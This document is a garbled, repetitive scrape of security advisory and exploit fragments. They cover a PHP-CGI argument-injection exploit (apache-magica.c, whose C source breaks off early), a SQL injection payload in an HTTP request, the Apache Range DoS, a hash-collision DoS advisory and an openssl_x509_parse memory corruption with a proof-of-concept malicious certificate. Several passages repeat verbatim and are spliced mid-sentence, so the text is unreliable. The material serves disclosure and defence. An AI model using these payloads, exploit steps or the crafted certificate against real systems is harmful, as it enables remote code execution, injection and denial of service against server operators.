Windows NT 6.0)  \nAccept: */*  \n  \npassword=g00dPa$$w0rD&username=xlgskuot%27%20or%20%28sleep%282%29%2b1%29%20limit%201%20--%20  \n  \n  \n  \nApache httpd Remote Denial of Service  \n*************************************  \n  \n  \nA denial of service vulnerability has been found in the way the multiple overlapping ranges   \nare handled by the Apache HTTPD server:   \n  \nhttp://seclists.org/fulldisclosure/2011/Aug/175   \n  \nCVE-2011-3192   \n  \nAn attack tool is circulating in the wild.

When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described.

When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with

When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with Suhosin-Patch\r\nAffected versions\r\nPHP prior to 5.3.12\r\nPHP prior to 5.4.2\r\nUnaffected versions\r\nPHP 4 - getopt parser unexploitable\r\nPHP 5.3.12 and up\r\nPHP 5.4.2 and up\r\nUnaffected versions are patched by CVE-2012-1823.\r\n*/\r\n/*    .\r\n     /'\\rrq rk\r\n .  // \\\\  .\r\n.x.//fco\\\\-|-\r\n '//cmtco\\\\zt\r\n //6meqrg.\\\\tq\r\n//_________\\\\'\r\nEJPGQO\r\napache-magica.c by Kingcope\r\n*/\r\n\r\n#include &lt;stdio.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;unistd.h&gt;\r\n#include &lt;getopt.h&gt;\r\n#include &lt;sys/types.h&gt;\r\n#include &lt;stddef.h&gt;\r\n#include &lt;openssl/rand.h&gt;\r\n#include &lt;openssl/ssl.h&gt;\r\n#include &lt;openssl/err.h&gt;\r\n#include &lt;netdb.h&gt;\r\n#include &lt;sys/socket.h&gt;\r\n#include &lt;netinet/in.h&gt;\r\n\r\ntypedef struct {\r\n\tint sockfd;\r\n\tSSL *handle;\r\n\tSSL_CTX *ctx;\r\n} connection;\r\n\r\nvoid usage(char *argv[])\r\n{\r\n  printf(&quot;usage: %s &lt;--target target&gt;

When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with

This can be exploited to execute arbitrary system commands or disclose the PHP source code. \n\n### Resolution\n\nUpgrade PHP to version 5.4.3 or 5.3.13 or higher. \n\n### References\n\n<http://secunia.com/advisories/49014>  \n<http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823>  \n\n\n### Limitations\n\nThis exploit has been tested against PHP 5.3.10 on Windows XP SP3 and PHP 5.4.0 on Ubuntu 11.10 Linux. \n\n### Platforms\n\nWindows  \nLinux  \nMac OS X  \n  \n\n",

When the php5-cgi package is installed on Debian and\r\nUbuntu or php-cgi is installed manually the php-cgi binary is accessible under\r\n/cgi-bin/php5 and /cgi-bin/php. The vulnerability makes it possible to execute\r\nthe binary because this binary has a security check enabled when installed with\r\nApache http server and this security check is circumvented by the exploit.\r\nWhen accessing the php-cgi binary the security check will block the request and\r\nwill not execute the binary.\r\nIn the source code file sapi/cgi/cgi_main.c of PHP we can see that the security\r\ncheck is done when the php.ini configuration setting cgi.force_redirect is set\r\nand the php.ini configuration setting cgi.redirect_status_env is set to no.\r\nThis makes it possible to execute the binary bypassing the Security check by\r\nsetting these two php.ini settings.\r\nPrior to this code for the Security check getopt is called and it is possible\r\nto set cgi.force_redirect to zero and cgi.redirect_status_env to zero using the\r\n-d switch. If both values are set to zero and the request is sent to the server\r\nphp-cgi gets fully executed and we can use the payload in the POST data field\r\nto execute arbitrary php and therefore we can execute programs on the system.\r\napache-magika.c is an exploit that does exactly the prior described. It does\r\nsupport SSL.\r\n/* Affected and tested versions\r\nPHP 5.3.10\r\nPHP 5.3.8-1\r\nPHP 5.3.6-13\r\nPHP 5.3.3\r\nPHP 5.2.17\r\nPHP 5.2.11\r\nPHP 5.2.6-3\r\nPHP 5.2.6+lenny16 with

Web application servers or platforms commonly parse\r\nattacker-controlled POST form data into hash tables automatically, so\r\nthat they can be accessed by application developers.\r\n\r\nIf the language does not provide a randomized hash function or the\r\napplication server does not recognize attacks using multi-collisions, an\r\nattacker can degenerate the hash table by sending lots of colliding\r\nkeys. The algorithmic complexity of inserting n elements into the table\r\nthen goes to O(n**2), making it possible to exhaust hours of CPU time\r\nusing a single HTTP request.\r\n\r\nThis issue has been known since at least 2003 and has influenced Perl\r\nand CRuby 1.9 to change their hash functions to include randomization.\r\n\r\nWe show that PHP 5, Java, ASP.NET as well as v8 are fully vulnerable to\r\nthis issue and PHP 4, Python and Ruby are partially vulnerable,\r\ndepending on version or whether the server running the code is a 32 bit\r\nor 64 bit machine.\r\n\r\nDescription:\r\n\r\n= Theory =\r\n\r\nMost hash functions used in hash table implementations can be broken\r\nfaster than by using brute-force techniques (which is feasible for hash\r\nfunctions with 32 bit output, but very expensive for 64 bit functions)\r\nby using one of two \u201ctricks\u201d: equivalent substrings or a\r\nmeet-in-the-middle attack.\r\n\r\n== Equivalent substrings ==\r\n\r\nSome hash functions have the property that if two strings collide, e.g.\r\nhash('string1') = hash('string2'), then hashes having this substring at\r\nthe same position collide as well, e.g. hash('prefixstring1postfix') =\r\nhash('prefixstring2postfix'). If for example 'Ez' and 'FY' collide under\r\na hash function with this property, then 'EzEz', 'EzFY', 'FYEz', 'FYFY'\r\ncollide as well. An observing reader may notice that this is very\r\nsimilar to binary counting from zero to four. Using this knowledge, an\r\nattacker can construct arbitrary numbers of collisions (2^n for\r\n2*n-sized strings in this example).\r\n\r\n== Meet-in-the-middle attack ==\r\n\r\nIf equivalent substrings are not present in a given hash function, then\r\nbrute-force seems to be the only solution. The obvious way to best use\r\nbrute-force would be to choose a target value and hash random\r\n(fixed-size) strings and store those which hash to the target value. For\r\na non-biased hash function with 32 bit output length, the probability of\r\nhitting a target in this way is 1/(2^32).\r\n\r\nA meet-in-the-middle attack now tries to hit more than one target at a\r\ntime. If the hash function can be inverted and the internal state of the\r\nhash function has the same size as the output, one can split the string\r\ninto two parts, a prefix (of size n) and a postfix (of size m). One can\r\nnow iterate over all possible m-sized postfix strings and calculate the\r\nintermediate value under which the hash function maps to a certain\r\ntarget. If one stores these strings and corresponding intermediate value\r\nin a lookup table, one can now generate random n-sized prefix strings\r\nand see if they map to one of the intermediate values in the lookup\r\ntable. If this is the case, the complete string will map to the target\r\nvalue.\r\n\r\nSplitting in the middle reduces the complexity of this attack by the\r\nsquare root, which gives us the probability of 1/(2^16) for a collision,\r\nthus enabling an attacker to generate multi-collisions much faster.\r\n\r\nThe hash functions we looked at which were vulnerable to an equivalent\r\nsubstring attack were all vulnerable to a meet-in-the-middle attack as\r\nwell. In this case, the meet-in-the-middle attack provides more\r\ncollisions for strings of a fixed size than the equivalent substring\r\nattack.\r\n\r\n= The real world =\r\n\r\nThe different language use different hash functions which suffer from\r\ndifferent problems. They also differ in how they use hash tables in\r\nstoring POST form data.\r\n\r\n== PHP 5 ==\r\n\r\nPHP 5 uses the DJBX33A (Dan Bernstein's times 33, addition) hash\r\nfunction and parses POST form data into the $_POST hash table. Because\r\nof the structure of the hash function, it is vulnerable to an equivalent\r\nsubstring attack.\r\n\r\nThe maximal POST request size is typically limited to 8 MB, which when\r\nfilled with a set of multi-collisions would consume about four hours of\r\nCPU time on an i7 core. Luckily, this time can not be exhausted because\r\nit is limited by the max_input_time (default configuration: -1,\r\nunlimited), Ubuntu and several BSDs: 60 seconds) configuration\r\nparameter. If the max_input_time parameter is set to -1 (theoretically:\r\nunlimited), it is bound by the max_execution_time configuration\r\nparameter (default value: 30).\r\n\r\nOn an i7 core, the 60 seconds take a string of multi-collisions of about\r\n500k. 30 seconds of CPU time can be generated using a string of about\r\n300k. This means that an attacker needs about 70-100kbit/s to keep one\r\ni7 core constantly busy. An attacker with a Gigabit connection can keep\r\nabout 10.000 i7 cores busy.\r\n\r\n== ASP.NET ==\r\n\r\nASP.NET uses the Request.Form object to provide POST data to a web\r\napplication developer. This object is of class NameValueCollection. This\r\nuses a different hash function than the standard .NET one, namely\r\nCaseInsensitiveHashProvider.getHashCode(). This is the DJBX33X (Dan\r\nBernstein's times 33, XOR) hash function on the uppercase version of the\r\nkey, which is breakable using a meet-in-the-middle attack.\r\n\r\nCPU time is limited by the IIS webserver to a value of typically 90\r\nseconds. This allows an attacker with about 30kbit/s to keep one Core2\r\ncore constantly busy. An attacker with a Gigabit connection can keep\r\nabout 30.000 Core2 cores busy.\r\n\r\n== Java ==\r\n\r\nJava offers the HashMap and Hashtable classes, which use the\r\nString.hashCode() hash function. It is very similar to DJBX33A (instead\r\nof 33, it uses the multiplication constant 31 and instead of the start\r\nvalue 5381 it uses 0). Thus it is also vulnerable to an equivalent\r\nsubstring attack. When hashing a string, Java also caches the hash value\r\nin the hash attribute, but only if the result is different from zero.\r\nThus, the target value zero is particularly interesting for an attacker\r\nas it prevents caching and forces re-hashing.\r\n\r\nDifferent web application parse the POST data differently, but the ones\r\ntested (Tomcat, Geronima, Jetty, Glassfish) all put the POST form data\r\ninto either a Hashtable or HashMap object. The maximal POST sizes also\r\ndiffer from server to server, with 2 MB being the most common.\r\n\r\nA Tomcat 6.0.32 server parses a 2 MB string of colliding keys in about\r\n44 minutes of i7 CPU time, so an attacker with about 6 kbit/s can keep\r\none i7 core constantly busy. If the attacker has a Gigabit connection,\r\nhe can keep about 100.000 i7 cores busy.\r\n\r\n== Python ==\r\n\r\nPython uses a hash function which is very similar to DJBX33X, which can\r\nbe broken using a meet-in-the-middle attack. It operates on register\r\nsize and is thus different for 64 and 32 bit machines. While generating\r\nmulti-collisions efficiently is also possible for the 64 bit version of\r\nthe function, the resulting colliding strings are too large to be\r\nrelevant for anything more than an academic attack.\r\n\r\nPlone as the most prominent Python web framework accepts 1 MB of POST\r\ndata, which it parses in about 7 minutes of CPU time in the worst case.\r\nThis gives an attacker with about 20 kbit/s the possibility to keep one\r\nCore Duo core constantly busy. If the attacker is in the position to\r\nhave a Gigabit line available, he can keep about 50.000 Core Duo cores\r\nbusy.\r\n\r\n== Ruby ==\r\n\r\nThe Ruby language consists of several implementations which do not share\r\nthe same hash functions. It also differs in versions (1.8, 1.9), which \u2212\r\ndepending on the implementation \u2212 also do not necessarily share the same\r\nhash function.\r\n\r\nThe hash function of CRuby 1.9 has been using randomization since 2008\r\n(a result of the algorithmic complexity attacks disclosed in 2003). The\r\nCRuby 1.8 function is very similar to DJBX33A, but the large\r\nmultiplication constant of 65599 prevents an effective equivalent\r\nsubstring attack. The hash function can be easily broken using a meet-\r\nin-the-middle attack, though. JRuby uses the CRuby 1.8 hash function for\r\nboth 1.8 and 1.9. Rubinius uses a different hash function but also does\r\nnot randomize it.\r\n\r\nA typical POST size limit in Ruby frameworks is 2 MB, which takes about\r\n6 hours of i7 CPU time to parse. Thus, an attacker with a single 850\r\nbits/s line can keep one i7 core busy. The other way around, an attacker\r\nwith a Gigabit connection can keep about 1.000.000 (one million!) i7\r\ncores busy.\r\n\r\n== v8 ==\r\n\r\nGoogle's Javascript implementation v8 uses a hash function which looks\r\ndifferent from the ones seen before, but can be broken using a meet-in-\r\nthe-middle attack, too.\r\n\r\nNode.js uses v8 to run Javascript-based web applications. The\r\nquerystring module parses POST data into a hash table structure.\r\n\r\nAs node.js does not limit the POST size by default (we assume this would\r\ntypically be the job of a framework), no effectiveness/efficiency\r\nmeasurements were performed.\r\n\r\nImpact:\r\n\r\nAny website running one of the above technologies which provides the\r\noption to perform a POST request is vulnerable to very effective DoS\r\nattacks.\r\n\r\nAs the attack is just a POST request, it could also be triggered from\r\nwithin a (third-party) website. This means that a cross-site-scripting\r\nvulnerability on a popular website could lead to a very effective DDoS\r\nattack (not necessarily against the same website).\r\n\r\nFixes:\r\n\r\nThe Ruby Security Team was very helpful in addressing this issue and\r\nboth CRuby and JRuby provide updates for this issue with a randomized\r\nhash function (CRuby 1.8.7-p357, JRuby 1.6.5.1, CVE-2011-4815).\r\n\r\nOracle has decided there is nothing that needs to be fixed within Java\r\nitself, but will release an updated version of Glassfish in a future CPU\r\n(Oracle Security ticket S0104869).\r\n\r\nTomcat has released updates (7.0.23, 6.0.35) for this issue which limit\r\nthe number of request parameters using a configuration parameter. The\r\ndefault value of 10.000 should provide sufficient protection.\r\n\r\nWorkarounds:\r\n\r\nFor languages were no fixes have been issued (yet?), there are a number\r\nof workarounds.\r\n\r\n= Limiting CPU time =\r\n\r\nThe easiest way to reduce the impact of such an attack is to reduce the\r\nCPU time that a request is allowed to take. For PHP, this can be\r\nconfigured using the max_input_time parameter. On IIS (for ASP.NET),\r\nthis can be configured using the \u201cshutdown time limit for processes\u201d\r\nparameter.\r\n\r\n= Limiting maximal POST size =\r\n\r\nIf you can live with the fact that users can not put megabytes of data\r\ninto your forms, limiting the form size to a small value (in the 10s of\r\nkilobytes rather than the usual megabytes) can drastically reduce the\r\nimpact of the attack as well.\r\n\r\n= Limiting maximal number of parameters =\r\n\r\nThe updated Tomcat versions offer an option to reduce the amount of\r\nparameters accepted independent from the maximal POST size. Configuring\r\nthis is also possible using the Suhosin version of PHP using the\r\nsuhosin.{post|request}.max_vars parameters.\r\n\r\n________________________________________________________________________\r\nCredits:\r\nAlexander Klink, n.runs AG\r\nJulian W\u00e4lde, Technische Universit\u00e4t Darmstadt\r\n\r\nThe original theory behind this attack vector is described in the 2003\r\nUsenix Security paper \u201cDenial of Service via Algorithmic Complexity\r\nAttacks\u201d by Scott A.

The parser within\r\n  this helper function is not binary safe and can therefore be\r\n  tricked to write up to five NUL bytes outside of an allocated\r\n  buffer.\r\n \r\n  This problem can be triggered by x509 certificates that contain\r\n  NUL bytes in their notBefore and notAfter timestamp fields and\r\n  leads to a memory corruption that might result in arbitrary\r\n  code execution.\r\n \r\n  Depending on how openssl_x509_parse() is used within a PHP\r\n  application the attack requires either a malicious cert signed\r\n  by a compromised/malicious CA or can be carried out with a\r\n  self-signed cert.\r\n\r\nDetails:\r\n\r\n  The PHP function openssl_x509_parse() is used by PHP applications\r\n  to parse additional information out of x509 certificates, usually\r\n  to harden SSL encrypted communication channels against MITM\r\n  attacks. In the wild we have seen the following use cases for this\r\n  function:\r\n \r\n   * output certificate debugging information\r\n     (e.g. cacert.org/analyse.php)\r\n   * webmail application with SMIME support\r\n   * client certificate handling\r\n   * certificate pinning\r\n   * verification of other certificate properties\r\n     (e.g. a default Wordpress install if ext/curl is not loaded)\r\n     \r\n  When we backported security fixes for some previous security\r\n  vulnerabilities in PHP&#39;s openssl to PHP 4.4.9 as part of our\r\n  PHP security backport services that we provide to customers,\r\n  we performed a quick audit of openssl_x509_parse() and all the\r\n  functions it calls, which led to the discovery of a memory\r\n  corruption vulnerability.\r\n \r\n  Within the function openssl_x509_parse() the helper function\r\n  asn1_time_to_time_t() is called two times to parse the\r\n  notBefore and notAfter ASN1 string timestamps from the cert\r\n  into integer time_t values as you can see below:\r\n \r\n     add_assoc_long(return_value, &#34;validFrom_time_t&#34;,\r\nasn1_time_to_time_t(X509_get_notBefore(cert) TSRMLS_CC));\r\n     add_assoc_long(return_value, &#34;validTo_time_t&#34;,\r\nasn1_time_to_time_t(X509_get_notAfter(cert) TSRMLS_CC));\r\n \r\n  When you take a look into this helper function you will see\r\n  that it only contains a quickly hacked parser that was never\r\n  really improved since its introduction in PHP 4.0.6. The author\r\n  of this parser was even aware of its hackishness as you can see\r\n  from the error message contained in the code:\r\n \r\n  static time_t asn1_time_to_time_t(ASN1_UTCTIME * timestr TSRMLS_DC) /*\r\n{{{ */\r\n  {\r\n  /*\r\n     This is how the time string is formatted:\r\n     snprintf(p, sizeof(p), &#34;%02d%02d%02d%02d%02d%02dZ&#34;,ts-&#62;tm_year%100,\r\n        ts-&#62;tm_mon+1,ts-&#62;tm_mday,ts-&#62;tm_hour,ts-&#62;tm_min,ts-&#62;tm_sec);\r\n  */\r\n\r\n     time_t ret;\r\n     struct tm thetime;\r\n     char * strbuf;\r\n     char * thestr;\r\n     long gmadjust = 0;\r\n\r\n     if (timestr-&#62;length &#60; 13) {\r\n        php_error_docref(NULL TSRMLS_CC, E_WARNING, &#34;extension author\r\ntoo lazy to parse %s correctly&#34;, timestr-&#62;data);\r\n        return (time_t)-1;\r\n     }\r\n\r\n However the actual problem of the code should become obvious when\r\n you read the rest of the parsing code that attempts to first\r\n duplicate the timestamp string and then parses the timestamp by\r\n going through the copy in reverse order and writing five NUL bytes\r\n into the duplicated string.\r\n\r\n     strbuf = estrdup((char *)timestr-&#62;data);\r\n\r\n     memset(&thetime, 0, sizeof(thetime));\r\n\r\n     /* we work backwards so that we can use atoi more easily */\r\n\r\n     thestr = strbuf + timestr-&#62;length - 3;\r\n\r\n     thetime.tm_sec = atoi(thestr);\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_min = atoi(thestr);\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_hour = atoi(thestr);\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_mday = atoi(thestr);\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_mon = atoi(thestr)-1;\r\n     *thestr = &#39;\\0&#39;;\r\n     thestr -= 2;\r\n     thetime.tm_year = atoi(thestr);\r\n\r\n  The problem with this code is that ASN1 strings can contain NUL\r\n  bytes, while the parser is not binary safe. This means if a\r\n  timestamp string inside a x509 certificate contains a NUL byte\r\n  at e.g. position 13 the estrdup() will only allocate 14 bytes\r\n  for a copy of the string, but the parser will attempt to write\r\n  five NUL bytes to memory addressed by the ASN1 length of the\r\n  string. If the real string length is longer than 16 bytes this\r\n  will result in writes of NUL bytes outside of the allocated\r\n  buffer.\r\n \r\n  Because of PHP&#39;s deterministic heap memory layout that can be\r\n  controlled a lot by sending e.g. POST variables and using\r\n  duplicate variable names to poke memory holes this vulnerability\r\n  must be considered exploitable. However the actual exploit will\r\n  depend a lot on how the PHP application uses openssl_x509_parse()\r\n  and a lot of other factors.\r\n\r\n  Depending on which of the actual use cases the function is used\r\n  for by an application, an attacker can trigger the memory\r\n  corruption with a self-signed certificate. An example for this\r\n  is the public analyse.php x509 cert debugging script provided\r\n  by CACert on their webserver.\r\n \r\n  Other applications like Wordpress use openssl_x509_parse() to\r\n  further verify SSL certificates whenever Wordpress connects to\r\n  a HTTPS URL (in case ext/curl is not loaded which is the default\r\n  for several linux distributions). Because the parsing only\r\n  happens after the initial SSL connection is established this\r\n  can only be abused by attackers controlling a malicious trusted\r\n  cert. However recent disclosures of alleged NSA capabilities,\r\n  the French incident and disclosures about fully compromised\r\n  trusted CAs in the past years have shown that this capability\r\n  might be in the reach of malicious attackers.\r\n\r\n\r\nProof of Concept:\r\n\r\n  The following x509 certificate demonstrates the out of bounds write:\r\n \r\n  -----BEGIN CERTIFICATE-----\r\n  MIIEpDCCA4ygAwIBAgIJAJzu8r6u6eBcMA0GCSqGSIb3DQEBBQUAMIHDMQswCQYD\r\n  VQQGEwJERTEcMBoGA1UECAwTTm9yZHJoZWluLVdlc3RmYWxlbjEQMA4GA1UEBwwH\r\n  S8ODwrZsbjEUMBIGA1UECgwLU2VrdGlvbkVpbnMxHzAdBgNVBAsMFk1hbGljaW91\r\n  cyBDZXJ0IFNlY3Rpb24xITAfBgNVBAMMGG1hbGljaW91cy5zZWt0aW9uZWlucy5k\r\n  ZTEqMCgGCSqGSIb3DQEJARYbc3RlZmFuLmVzc2VyQHNla3Rpb25laW5zLmRlMHUY\r\n  ZDE5NzAwMTAxMDAwMDAwWgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n  AAAAAAAXDTE0MTEyODExMzkzNVowgcMxCzAJBgNVBAYTAkRFMRwwGgYDVQQIDBNO\r\n  b3JkcmhlaW4tV2VzdGZhbGVuMRAwDgYDVQQHDAdLw4PCtmxuMRQwEgYDVQQKDAtT\r\n  ZWt0aW9uRWluczEfMB0GA1UECwwWTWFsaWNpb3VzIENlcnQgU2VjdGlvbjEhMB8G\r\n  A1UEAwwYbWFsaWNpb3VzLnNla3Rpb25laW5zLmRlMSowKAYJKoZIhvcNAQkBFhtz\r\n  dGVmYW4uZXNzZXJAc2VrdGlvbmVpbnMuZGUwggEiMA0GCSqGSIb3DQEBAQUAA4IB\r\n  DwAwggEKAoIBAQDDAf3hl7JY0XcFniyEJpSSDqn0OqBr6QP65usJPRt/8PaDoqBu\r\n  wEYT/Na+6fsgPjC0uK9DZgWg2tHWWoanSblAMoz5PH6Z+S4SHRZ7e2dDIjPjdhjh\r\n  0mLg2UMO5yp0V797Ggs9lNt6JRfH81MN2obXWs4NtztLMuD6egqpr8dDbr34aOs8\r\n  pkdui5UawTZksy5pLPHq5cMhFGm06v65CLo0V2Pd9+KAokPrPcN5KLKebz7mLpk6\r\n  SMeEXOKP4idEqxyQ7O7fBuHMedsQhu+prY3si3BUyKfQtP5CZnX2bp0wKHxX12DX\r\n  1nfFIt9DbGvHTcyOuN+nZLPBm3vWxntyIIvVAgMBAAGjQjBAMAkGA1UdEwQCMAAw\r\n  EQYJYIZIAYb4QgEBBAQDAgeAMAsGA1UdDwQEAwIFoDATBgNVHSUEDDAKBggrBgEF\r\n  BQcDAjANBgkqhkiG9w0BAQUFAAOCAQEAG0fZYYCTbdj1XYc+1SnoaPR+vI8C8CaD\r\n  8+0UYhdnyU4gga0BAcDrY9e94eEAu6ZqycF6FjLqXXdAboppWocr6T6GD1x33Ckl\r\n  VArzG/KxQohGD2JeqkhIMlDomxHO7ka39+Oa8i2vWLVyjU8AZvWMAruHa4EENyG7\r\n  lW2AagaFKFCr9TnXTfrdxGVEbv7KVQ6bdhg5p5SjpWH1+Mq03uR3ZXPBYdyV8319\r\n  o0lVj1KFI2DCL/liWisJRoof+1cR35Ctd0wYBcpB6TZslMcOPl76dwKwJgeJo2Qg\r\n  Zsfmc2vC1/qOlNuNq/0TzzkVGv8ETT3CgaU+UXe4XOVvkccebJn2dg==\r\n  -----END CERTIFICATE-----\r\n\r\n\r\nDisclosure Timeline: \r\n\r\n  01.

In the wild we have seen the following use cases for this\r\n  function:\r\n  \r\n   * output certificate debugging information\r\n     (e.g. cacert.org/analyse.php)\r\n   * webmail application with SMIME support\r\n   * client certificate handling\r\n   * certificate pinning\r\n   * verification of other certificate properties\r\n     (e.g. a default Wordpress install if ext/curl is not loaded)\r\n      \r\n  When we backported security fixes for some previous security\r\n  vulnerabilities in PHP's openssl to PHP 4.4.9 as part of our\r\n  PHP security backport services that we provide to customers,\r\n  we performed a quick audit of openssl_x509_parse() and all the\r\n  functions it calls, which led to the discovery of a memory\r\n  corruption vulnerability.\r\n  \r\n  Within the function openssl_x509_parse() the helper function\r\n  asn1_time_to_time_t() is called two times to parse the\r\n  notBefore and notAfter ASN1 string timestamps from the cert\r\n  into integer time_t values as you can see below:\r\n  \r\n     add_assoc_long(return_value, \"validFrom_time_t\",\r\nasn1_time_to_time_t(X509_get_notBefore(cert) TSRMLS_CC));\r\n     add_assoc_long(return_value, \"validTo_time_t\",\r\nasn1_time_to_time_t(X509_get_notAfter(cert) TSRMLS_CC));\r\n  \r\n  When you take a look into this helper function you will see\r\n  that it only contains a quickly hacked parser that was never\r\n  really improved since its introduction in PHP 4.0.6. The author\r\n  of this parser was even aware of its hackishness as you can see\r\n  from the error message contained in the code:\r\n  \r\n  static time_t asn1_time_to_time_t(ASN1_UTCTIME * timestr TSRMLS_DC) /*\r\n{{{ */\r\n  {\r\n  /*\r\n     This is how the time string is formatted:\r\n     snprintf(p, sizeof(p), \"%02d%02d%02d%02d%02d%02dZ\",ts->tm_year%100,\r\n        ts->tm_mon+1,ts->tm_mday,ts->tm_hour,ts->tm_min,ts->tm_sec);\r\n  */\r\n \r\n     time_t ret;\r\n     struct tm thetime;\r\n     char * strbuf;\r\n     char * thestr;\r\n     long gmadjust = 0;\r\n \r\n     if (timestr->length < 13) {\r\n        php_error_docref(NULL TSRMLS_CC, E_WARNING, \"extension author\r\ntoo lazy to parse %s correctly\", timestr->data);\r\n        return (time_t)-1;\r\n     }\r\n \r\n However the actual problem of the code should become obvious when\r\n you read the rest of the parsing code that attempts to first\r\n duplicate the timestamp string and then parses the timestamp by\r\n going through the copy in reverse order and writing five NUL bytes\r\n into the duplicated string.\r\n \r\n     strbuf = estrdup((char *)timestr->data);\r\n \r\n     memset(&thetime, 0, sizeof(thetime));\r\n \r\n     /* we work backwards so that we can use atoi more easily */\r\n \r\n     thestr = strbuf + timestr->length - 3;\r\n \r\n     thetime.tm_sec = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_min = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_hour = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mday = atoi(thestr);\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_mon = atoi(thestr)-1;\r\n     *thestr = '\\0';\r\n     thestr -= 2;\r\n     thetime.tm_year = atoi(thestr);\r\n \r\n  The problem with this code is that ASN1 strings can contain NUL\r\n  bytes, while the parser is not binary safe. This means if a\r\n  timestamp string inside a x509 certificate contains a NUL byte\r\n  at e.g. position 13 the estrdup() will only allocate 14 bytes\r\n  for a copy of the string, but the parser will attempt to write\r\n  five NUL bytes to memory addressed by the ASN1 length of 